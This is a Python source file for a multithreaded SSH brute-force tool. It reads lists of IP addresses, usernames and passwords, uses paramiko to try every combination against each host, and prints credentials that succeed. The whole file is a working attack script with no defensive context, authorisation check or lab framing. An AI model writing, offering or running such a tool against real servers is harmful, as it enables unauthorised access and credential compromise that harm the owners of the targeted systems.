import ipaddress
import sys
import os
import getopt
import paramiko
import threading
import time

MAX_THREADS = 100
TIMEOUT = 10  # in seconds
UI_WIDTH = 80
UI_HEIGHT = 24

class BruteForceArgs:
    def __init__(self, ip, username, password):
        self.ip = ip
        self.username = username
        self.password = password

def attempt_connect(args):
    try:
        session = paramiko.SSHClient()
        session.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        session.connect(str(args.ip), username=args.username, password=args.password, timeout=5)
        print(f"Success: {args.ip} {args.username} {args.password}")
        session.close()
    except:
        pass

def read_file(filename):
    with open(filename, 'r') as file:
        return [line.strip() for line in file.readlines()]

def draw_ui():
    os.system('cls' if os.name == 'nt' else 'clear')
    print('+' + '-' * (UI_WIDTH - 2) + '+')
    for _ in range(UI_HEIGHT - 2):
        print('|' + ' ' * (UI_WIDTH - 2) + '|')
    print('+' + '-' * (UI_WIDTH - 2) + '+')

def main():
    try:
        opts, args = getopt.getopt(sys.argv[1:], "h:p:u:T:t:", ["help"])
    except getopt.GetoptError as err:
        print(f"Error: {err}")
        print("Usage: python bruteforce.py -h <ip_list_file> -p <password_list_file> -u <user_list_file> -T <max_threads> -t <timeout> or --help")
        return

    ip_list_file = "ip_list.txt"
    user_list_file = "user_list.txt"
    password_list_file = "password_list.txt"
    max_threads = MAX_THREADS
    timeout = TIMEOUT

    for opt, arg in opts:
        if opt == "-h":
            ip_list_file = arg
        elif opt == "-p":
            password_list_file = arg
        elif opt == "-u":
            user_list_file = arg
        elif opt == "-T":
            max_threads = int(arg)
        elif opt == "-t":
            timeout = int(arg)
        elif opt == "--help":
            print("Usage: python bruteforce.py -h <ip_list_file> -p <password_list_file> -u <user_list_file> -T <max_threads> -t <timeout>")
            print("Options:")
            print("  -h <ip_list_file>       Path to the file containing the IP addresses to test.")
            print("  -p <password_list_file> Path to the file containing the passwords to try.")
            print("  -u <user_list_file>     Path to the file containing the usernames to try.")
            print("  -T <max_threads>        Maximum number of concurrent threads to use.")
            print("  -t <timeout>            Timeout in seconds for each thread.")
            print("  --help                  Display this help message.")
            return

    ip_list = [ipaddress.IPv4Address(ip.strip()) for ip in read_file(ip_list_file)]
    user_list = read_file(user_list_file)
    password_list = read_file(password_list_file)

    threads_args = []

    for ip in ip_list:
        for user in user_list:
            for password in password_list:
                if len(threads_args) >= max_threads:
                    threads = []
                    for args in threads_args:
                        t = threading.Thread(target=attempt_connect, args=(args,))
                        t.start()
                        threads.append(t)
                    for t in threads:
                        t.join(timeout)
                    threads_args.clear()
                threads_args.append(BruteForceArgs(ip, user, password))

    threads = []
    for args in threads_args:
        t = threading.Thread(target=attempt_connect, args=(args,))
        t.start()
        threads.append(t)
    for t in threads:
        t.join(timeout)

    draw_ui()

if __name__ == "__main__":
    main()
